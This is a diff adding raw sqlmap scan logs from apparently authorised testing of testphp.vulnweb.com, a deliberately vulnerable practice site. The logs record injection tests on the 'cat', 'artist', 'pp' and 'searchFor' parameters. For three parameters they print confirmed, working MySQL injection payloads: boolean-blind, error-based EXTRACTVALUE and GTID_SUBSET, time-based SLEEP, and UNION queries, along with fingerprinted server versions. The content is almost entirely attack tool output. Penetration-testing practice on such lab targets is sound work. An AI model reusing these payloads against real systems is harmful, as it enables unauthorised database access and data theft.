@@ -1,0 +1,299 @@
+=== SQLMap Output: GET http://testphp.vulnweb.com/listproducts.php?cat=2 (get) ===
+___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.11#stable}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:40:54 /2026-02-16/
+
+[23:40:54] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4482.0 Safari/537.36 Edg/92.0.874.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[23:40:54] [INFO] flushing session file
+[23:40:54] [INFO] testing connection to the target URL
+[23:40:55] [INFO] checking if the target is protected by some kind of WAF/IPS
+[23:40:55] [INFO] testing if the target URL content is stable
+[23:40:55] [INFO] target URL content is stable
+[23:40:55] [INFO] testing if GET parameter 'cat' is dynamic
+[23:40:56] [INFO] GET parameter 'cat' appears to be dynamic
+[23:40:56] [INFO] heuristic (basic) test shows that GET parameter 'cat' might be injectable (possible DBMS: 'MySQL')
+[23:40:56] [INFO] heuristic (XSS) test shows that GET parameter 'cat' might be vulnerable to cross-site scripting (XSS) attacks
+[23:40:56] [INFO] testing for SQL injection on GET parameter 'cat'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[23:40:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[23:40:57] [WARNING] reflective value(s) found and filtering out
+[23:40:59] [INFO] GET parameter 'cat' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Sed")
+[23:40:59] [INFO] testing 'Generic inline queries'
+[23:41:00] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[23:41:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[23:41:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[23:41:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[23:41:02] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[23:41:02] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[23:41:03] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[23:41:03] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[23:41:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[23:41:04] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[23:41:05] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[23:41:05] [INFO] GET parameter 'cat' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable 
+[23:41:05] [INFO] testing 'MySQL inline queries'
+[23:41:05] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[23:41:05] [WARNING] time-based comparison requires larger statistical model, please wait......... (done)
+[23:41:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[23:41:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[23:41:13] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[23:41:13] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[23:41:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[23:41:14] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[23:41:28] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[23:41:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[23:41:28] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[23:41:29] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[23:41:31] [INFO] target URL appears to have 11 columns in query
+[23:41:32] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=2 AND 9962=9962
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: cat=2 AND EXTRACTVALUE(8652,CONCAT(0x5c,0x71706a7871,(SELECT (ELT(8652=8652,1))),0x7162767871))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cat=2 AND (SELECT 1424 FROM (SELECT(SLEEP(5)))wnRi)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=2 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706a7871,0x676a704264694f66436b776967766d42724e616d4659456652556c694c7571524958726155756b77,0x7162767871),NULL,NULL-- -
+---
+[23:41:32] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.1
+[23:41:36] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 23:41:36 /2026-02-16/
+
+=== SQLMap Output: GET http://testphp.vulnweb.com/artists.php?artist=3 (get) ===
+___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.11#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:42:25 /2026-02-16/
+
+[23:42:25] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[23:42:25] [INFO] flushing session file
+[23:42:25] [INFO] testing connection to the target URL
+[23:42:27] [INFO] checking if the target is protected by some kind of WAF/IPS
+[23:42:27] [INFO] testing if the target URL content is stable
+[23:42:27] [INFO] target URL content is stable
+[23:42:27] [INFO] testing if GET parameter 'artist' is dynamic
+[23:42:28] [INFO] GET parameter 'artist' appears to be dynamic
+[23:42:29] [INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable (possible DBMS: 'MySQL')
+[23:42:29] [INFO] heuristic (XSS) test shows that GET parameter 'artist' might be vulnerable to cross-site scripting (XSS) attacks
+[23:42:29] [INFO] testing for SQL injection on GET parameter 'artist'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[23:42:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[23:42:30] [WARNING] reflective value(s) found and filtering out
+[23:42:32] [INFO] GET parameter 'artist' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Sed")
+[23:42:32] [INFO] testing 'Generic inline queries'
+[23:42:32] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[23:42:32] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[23:42:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[23:42:33] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[23:42:34] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[23:42:34] [INFO] GET parameter 'artist' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[23:42:34] [INFO] testing 'MySQL inline queries'
+[23:42:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[23:42:34] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)
+[23:42:45] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[23:42:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[23:42:45] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[23:42:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[23:42:47] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[23:42:47] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[23:42:47] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[23:43:02] [INFO] GET parameter 'artist' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[23:43:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[23:43:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[23:43:15] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[23:43:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[23:43:21] [INFO] target URL appears to have 3 columns in query
+[23:43:24] [INFO] GET parameter 'artist' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'artist' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=3 AND 2089=2089
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: artist=3 AND GTID_SUBSET(CONCAT(0x71766b6a71,(SELECT (ELT(5501=5501,1))),0x717a767a71),5501)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=3 AND (SELECT 7430 FROM (SELECT(SLEEP(5)))otqx)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: artist=-8192 UNION ALL SELECT NULL,NULL,CONCAT(0x71766b6a71,0x4b726f6e79736e4c4d496169704a41597155695657625258574565797157657a6551775747535872,0x717a767a71)#
+---
+[23:43:25] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+[23:43:31] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 23:43:31 /2026-02-16/
+
+=== SQLMap Output: GET http://testphp.vulnweb.com/hpp?pp=12 (get) ===
+___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.11#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:44:32 /2026-02-16/
+
+[23:44:32] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[23:44:32] [INFO] flushing session file
+[23:44:32] [INFO] testing connection to the target URL
+got a 301 redirect to 'http://testphp.vulnweb.com/hpp/?pp=12'. Do you want to follow? [Y/n] Y
+[23:44:33] [INFO] checking if the target is protected by some kind of WAF/IPS
+[23:44:34] [INFO] testing if the target URL content is stable
+[23:44:35] [WARNING] GET parameter 'pp' does not appear to be dynamic
+[23:44:36] [WARNING] heuristic (basic) test shows that GET parameter 'pp' might not be injectable
+[23:44:36] [INFO] heuristic (XSS) test shows that GET parameter 'pp' might be vulnerable to cross-site scripting (XSS) attacks
+[23:44:36] [INFO] testing for SQL injection on GET parameter 'pp'
+[23:44:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[23:44:37] [WARNING] reflective value(s) found and filtering out
+[23:44:47] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[23:44:49] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[23:44:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[23:44:59] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[23:45:08] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[23:45:16] [INFO] testing 'Generic inline queries'
+[23:45:17] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[23:45:17] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[23:45:21] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[23:45:29] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[23:45:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[23:45:43] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[23:45:51] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[23:45:55] [INFO] testing 'Oracle AND time-based blind'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[23:46:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[23:46:15] [WARNING] GET parameter 'pp' does not seem to be injectable
+[23:46:15] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+
+[*] ending @ 23:46:15 /2026-02-16/
+
+=== SQLMap Output: POST http://testphp.vulnweb.com/search.php?test=query (form-post) ===
+___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.11#stable}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 23:46:16 /2026-02-16/
+
+[23:46:16] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[23:46:16] [INFO] flushing session file
+[23:46:16] [INFO] testing connection to the target URL
+[23:46:17] [INFO] checking if the target is protected by some kind of WAF/IPS
+[23:46:18] [INFO] testing if the target URL content is stable
+[23:46:18] [INFO] target URL content is stable
+[23:46:18] [INFO] testing if POST parameter 'searchFor' is dynamic
+[23:46:18] [WARNING] POST parameter 'searchFor' does not appear to be dynamic
+[23:46:19] [INFO] heuristic (basic) test shows that POST parameter 'searchFor' might be injectable (possible DBMS: 'MySQL')
+[23:46:19] [INFO] heuristic (XSS) test shows that POST parameter 'searchFor' might be vulnerable to cross-site scripting (XSS) attacks
+[23:46:19] [INFO] testing for SQL injection on POST parameter 'searchFor'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[23:46:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[23:46:19] [WARNING] reflective value(s) found and filtering out
+[23:46:26] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[23:46:26] [INFO] testing 'Generic inline queries'
+[23:46:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[23:46:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[23:47:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[23:47:47] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[23:48:29] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[23:49:09] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[23:49:45] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[23:50:21] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[23:50:56] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[23:51:17] [INFO] POST parameter 'searchFor' appears to be 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable (with --string="Our")
+[23:51:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[23:51:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[23:51:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[23:51:18] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[23:51:18] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[23:51:19] [INFO] POST parameter 'searchFor' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
+[23:51:19] [INFO] testing 'MySQL inline queries'
+[23:51:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[23:51:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[23:51:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[23:51:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[23:51:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[23:51:21] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[23:51:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[23:51:43] [INFO] POST parameter 'searchFor' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[23:51:43] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[23:51:43] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[23:51:51] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[23:52:00] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[23:52:09] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[23:52:17] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[23:52:26] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[23:52:36] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[23:52:46] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[23:52:55] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[23:53:19] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[23:53:26] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+POST parameter 'searchFor' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 795 HTTP(s) requests:
+---
+Parameter: searchFor (POST)
+    Type: boolean-based blind
+    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: searchFor=1' AND EXTRACTVALUE(5866,CASE WHEN (5866=5866) THEN 5866 ELSE 0x3A END) AND 'Vzsc'='Vzsc
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: searchFor=1' AND GTID_SUBSET(CONCAT(0x7178627071,(SELECT (ELT(5853=5853,1))),0x717a767071),5853) AND 'dwDk'='dwDk
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: searchFor=1' AND (SELECT 9947 FROM (SELECT(SLEEP(5)))EpBD) AND 'mzqQ'='mzqQ
+---
+[23:53:40] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
+[23:53:44] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 23:53:44 /2026-02-16/
+
